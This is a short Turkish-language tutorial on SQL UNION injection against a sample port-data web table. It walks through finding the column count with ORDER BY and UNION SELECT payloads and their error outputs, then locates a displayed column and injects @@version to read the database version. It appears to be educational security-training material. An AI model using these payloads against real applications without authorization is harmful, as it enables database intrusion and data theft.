# UNION Injection

## Detect Number of Columns

Aşağıda verilen web uygulamasını ele alalım:

| PORT CODE | PORT CITY | PORT VOLUME |
|---|---|---|
| CN SHA | Shangai | 37.13 |
| CN SHE | Shenzhen | 23.97 |

Sonuçların getirildiği tabloda kaç adet sütun olduğunu bulmak için aşağıda verilen ifadeleri kullanabiliriz:

* ORDER BY
* UNION

### Using ORDER BY

!!! abstract

    ORDER BY ifadesi, hata alana kadar deneme yapmayı gerektirir.

Payload aşağıda verildiği gibi olsun:

```sql title="Payload"
' ORDER BY 1-- -
```

Payload web uygulamasına verildiğinde sonuçlar başarılı bir şekilde gelecektir.

Aynı işlemi devam ettirelim:

=== "2"

    ```sql title="Payload"
    ' ORDER BY 2-- -
    ```

=== "3"

    ```sql title="Payload"
    ' ORDER BY 3-- -
    ```

=== "4"

    ```sql title="Payload"
    ' ORDER BY 4-- -
    ```

=== "5"

    ```sql title="Payload"
    ' ORDER BY 5-- -
    ```

Sıralama 5. sütun için yapıldığında bir hata alınır.

Bu sayede, tabloda 4 adet sütun bulunduğu bilgisini elde etmiş oluruz:

```output title="Output"
Unknown column '5' in 'order clause'
```

### Using UNION

!!! abstract

    UNION ifadesi, hata almayana kadar deneme yapmayı gerektirir.

Payload aşağıda verildiği gibi olsun:

```sql title="Payload"
CN' UNION SELECT 1-- -
```

Payload web uygulamasına verildiğinde bir hata alınır:

```output title="Output"
The used SELECT statements have a different number of columns
```

Aynı işlemi devam ettirelim:

=== "2"

    ```sql title="Payload"
    CN' UNION SELECT 1,2-- -
    ```

=== "3"

    ```sql title="Payload"
    CN' UNION SELECT 1,2,3-- -
    ```

=== "4"

    ```sql title="Payload"
    CN' UNION SELECT 1,2,3,4-- -
    ```

Sıralama 4. sütun için yapıldığında sonuçlar başarılı bir şekilde gelecektir.

Bu sayede, tabloda 4 adet sütun bulunduğu bilgisini elde etmiş oluruz:

| PORT CODE | PORT CITY | PORT VOLUME |
|---|---|---|
| 2 | 3 | 4 |

## Location of Injection

Burada 1. sütun gizlidir, çünkü Port Code sütununda 2 rakamı vardır.

Bu yüzden 2. sütunu kullanalım:

```sql title="Payload"
CN' UNION SELECT 1,@@version,3,4-- -
```
